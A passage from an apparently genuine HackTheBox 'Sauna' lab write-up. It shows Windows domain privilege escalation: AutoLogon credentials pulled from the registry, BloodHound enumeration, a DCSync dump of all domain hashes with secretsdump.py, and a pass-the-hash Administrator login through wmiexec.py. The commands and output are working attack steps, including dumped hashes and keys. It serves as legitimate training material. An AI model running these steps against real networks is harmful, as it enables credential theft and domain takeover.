SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

### Uploading and running `winPEAS`

```bash
Evil-WinRM* PS C:\Users\FSmith\Documents> upload winPEASx64.exe
                                        
Info: Uploading /home/kali/Desktop/HackTheBox/Windows-boxes/sauna/winPEASx64.exe to C:\Users\FSmith\Documents\winPEASx64.exe
                                        
Data: 3183272 bytes of 3183272 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\FSmith\Documents> .\winPEASx64.exe
...
...
If installed, local administrator password is changed frequently and is restricted by ACL 
    LAPS Enabled: LAPS not installed

...
...
 Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!
...
...
```

Found creds for another user. `svc_loanmanager:Moneymakestheworldgoround!`

`NT\CurrentVersion\Winlogon` is **a subkey in the registry that can be used to turn on automatic logon in Windows. This also gives us the additional info we need.**

```bash
*Evil-WinRM* PS C:\Users\FSmith\Documents> reg.exe query "HKLM\software\microsoft\windows nt\currentversion\winlogon"

HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion\winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    DefaultDomainName    REG_SZ    EGOTISTICALBANK
    DefaultUserName    REG_SZ    EGOTISTICALBANK\svc_loanmanager
    DisableBackButton    REG_DWORD    0x1
    EnableSIHostIntegration    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ
    LegalNoticeText    REG_SZ
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    ShellCritical    REG_DWORD    0x0
    ShellInfrastructure    REG_SZ    sihost.exe
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    WinStationsDisabled    REG_SZ    0
    scremoveoption    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    LastLogOffEndTimePerfCounter    REG_QWORD    0x156458a35
    ShutdownFlags    REG_DWORD    0x13
    DisableLockWorkstation    REG_DWORD    0x0
    DefaultPassword    REG_SZ    Moneymakestheworldgoround!

HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion\winlogon\AlternateShells
HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion\winlogon\GPExtensions
HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion\winlogon\UserDefaults
HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion\winlogon\AutoLogonChecked
HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion\winlogon\VolatileUserMgrKey
```

But Running `net user` on the box showed there was no user `svc_loanmanager`:

```bash
*Evil-WinRM* PS C:\Users\FSmith\Documents> net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            FSmith                   Guest
HSmith                   krbtgt                   svc_loanmgr
The command completed with one or more errors.
```

But `svc_loanmgr` seemed pretty close. So, I tried the creds with that user, and it worked:

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/sauna]
└─$ evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> whoami
egotisticalbank\svc_loanmgr
```

Next, uploading and running `SharpHound` on the victim machine.

```bash
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> upload SharpHound.exe
                                        
Info: Uploading /home/kali/Desktop/HackTheBox/Windows-boxes/sauna/SharpHound.exe to C:\Users\svc_loanmgr\Documents\SharpHound.exe
                                        
Data: 1395368 bytes of 1395368 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> ./SharpHound.exe
2024-01-22T08:25:58.7339360-08:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2024-01-22T08:25:58.8901502-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-01-22T08:25:58.9214224-08:00|INFORMATION|Initializing SharpHound at 8:25 AM on 1/22/2024
2024-01-22T08:25:59.1088971-08:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for EGOTISTICAL-BANK.LOCAL : SAUNA.EGOTISTICAL-BANK.LOCAL
2024-01-22T08:26:23.2182809-08:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-01-22T08:26:23.4370647-08:00|INFORMATION|Beginning LDAP search for EGOTISTICAL-BANK.LOCAL
2024-01-22T08:26:23.4995278-08:00|INFORMATION|Producer has finished, closing LDAP channel
2024-01-22T08:26:23.4995278-08:00|INFORMATION|LDAP channel closed, waiting for consumers
2024-01-22T08:26:54.3277383-08:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 35 MB RAM
2024-01-22T08:27:22.2026446-08:00|INFORMATION|Consumers finished, closing output channel
2024-01-22T08:27:22.2651456-08:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2024-01-22T08:27:22.4839476-08:00|INFORMATION|Status: 94 objects finished (+94 1.59322)/s -- Using 42 MB RAM
2024-01-22T08:27:22.4839476-08:00|INFORMATION|Enumeration finished in 00:00:59.0506596
2024-01-22T08:27:22.5932894-08:00|INFORMATION|Saving cache with stats: 53 ID to type mappings.
 53 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2024-01-22T08:27:22.6089713-08:00|INFORMATION|SharpHound Enumeration Completed at 8:27 AM on 1/22/2024! Happy Graphing!

*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents>download 20240122082721_BloodHound.zip
                                        
Info: Downloading C:\Users\svc_loanmgr\Documents\20240122082721_BloodHound.zip to 20240122082721_BloodHound.zip
                                        
Info: Download successful!
```

Running `Bloodhound` and imported the `.zip` folder into `BloodHound` for further info gathering

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/3f349264-17d1-47ec-9240-26782a282c62/b87f6d14-6355-478c-b1a4-b707be77481e/Untitled.png)

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/3f349264-17d1-47ec-9240-26782a282c62/10ccc59f-e555-40dc-807b-634116a5fe0f/Untitled.png)

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/3f349264-17d1-47ec-9240-26782a282c62/6b581b54-a1fb-445b-bea1-34d6dbff4a08/Untitled.png)

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/3f349264-17d1-47ec-9240-26782a282c62/c3a2211b-1260-4f1a-9958-a388532d088a/Untitled.png)

After running `Bloohound`, I found an expoit path for privesc.

So gotta use a `DCSync` Attack to get `administrator` access.

### Running ‘secretsdump.py’ to get the NTLM hashes 

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/sauna]
└─$ python3 secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175' 
Impacket v0.11.0 - Copyright 2023 Fortra

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:3d118751bff2b456acd55ef0e172d29a:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:06a06dfe367f77162149dd9a44df9b2d24121d23cfd0a28277bcd145e839a6f8
SAUNA$:aes128-cts-hmac-sha1-96:bffab7af51b5407129b5dae2396ab37d
SAUNA$:des-cbc-md5:f27aa7c7df26e0ba
[*] Cleaning up...
```

After obtaining the `Admin's` hash, using [`wmiexec.py`](http://wmiexec.py) to login as a `Admin`

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/sauna]
└─$ /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e' -dc-ip 10.10.10.175 administrator@10.10.10.175

Impacket v0.11.0 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
egotisticalbank\administrator

C:\>
```

### Root Flag

```bash
C:\>dir
 Volume in drive C has no label.
 Volume Serial Number is 489C-D8FC

 Directory of C:\

01/23/2020  08:48 AM    <DIR>          inetpub
09/14/2018  11:19 PM    <DIR>          PerfLogs
07/13/2021  09:54 AM    <DIR>          Program Files
01/23/2020  03:11 PM    <DIR>          Program Files (x86)
01/24/2020  04:05 PM    <DIR>          Users
01/22/2024  07:54 AM    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)   7,847,018,496 bytes free

C:\>cd Users
C:\Users>cd Administrator
C:\Users\Administrator>cd Desktop
C:\Users\Administrator\Desktop>type root.txt
...SNIP...

C:\Users\Administrator\Desktop>
```
